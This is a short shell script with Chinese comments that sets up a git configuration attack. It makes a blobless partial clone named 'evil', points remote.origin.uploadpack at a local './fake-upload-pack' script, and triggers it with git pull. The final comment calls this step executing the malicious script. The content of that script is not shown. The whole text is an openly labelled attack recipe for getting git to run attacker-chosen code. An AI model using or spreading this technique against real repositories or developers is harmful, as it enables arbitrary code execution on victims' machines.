# 创建 tmp 仓库，设置uploadpack.allowfilter为true
git init tmp

git -C tmp config uploadpack.allowfilter 1

# 从 tmp 仓库 克隆 evil
git clone --filter=blob:none --no-local --no-checkout tmp evil

rm -rf tmp

# 配置远程过滤脚本
git -C evil config remote.origin.uploadpack "./fake-upload-pack"

# 执行恶意脚本
git pull
